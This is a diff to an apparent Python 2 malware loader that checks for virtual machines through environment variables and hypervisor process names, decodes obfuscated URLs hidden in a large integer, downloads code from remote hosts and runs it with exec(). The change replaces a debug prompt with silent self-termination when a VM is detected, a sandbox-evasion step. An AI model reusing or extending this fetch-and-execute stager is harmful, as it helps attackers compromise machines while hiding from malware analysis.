@@ -98,22 +98,27 @@ def main(*args, **kwargs):
                 
     s = 'tasklist' if os.name is 'nt' else 'ps'
     c = 0 if os.name is 'nt' else -1
+    
     if kwargs.get('checkvm'):
         check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
         check_procs   = [i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
         if len(check_environ + check_procs):
             if _debug:
-                print("\n\tVirtual Machine detected!\n")
-                
+                print("\n\tVirtual Machine detected\n")
                 if len(check_environ):
                     print("\nEnvironment variables:\n\t{}\n".format(', '.join(["{}".format(i) for i in check_environ])))
                 if len(check_procs):
                     print("\nRunning processes:\n\t{}\n".format(', '.join(["{}".format(i) for i in check_procs])))
-                if raw_input("\n\tAbort launch? (y/n): ").lower().startswith('y'):
-                    sys.exit(0)
+            else:
+                if os.name is 'nt':
+                    return 'taskkill /f %d' % os.getpid()
+                else:
+                    return 'kill -9 %d' % os.getpid()
+
     if 'config' in kwargs:
         AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
         SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
+        pkgs     = 'from __future__ import print_function\n'
         if 'z' in AccidentalAquaticCat:
             head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
             head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
@@ -121,19 +126,18 @@ def main(*args, **kwargs):
             foot = base64.b64decode(foot)
             body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
             body = QuadraticFungalLegend(body, foot)
-            pkgs = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
+            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
         else:
             head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
             head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
             body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
-            pkgs = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
+            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
         return (pkgs, body, head)
 
 
 if __name__ == '__main__':
     try:
         header, body, footer = main(checkvm=True, config=81126388790932157784)
-        body = body.replace('from __future__ import print_function','')
         code = '\n\n\n'.join([header, body, footer])
         exec(code)
     except Exception as e:
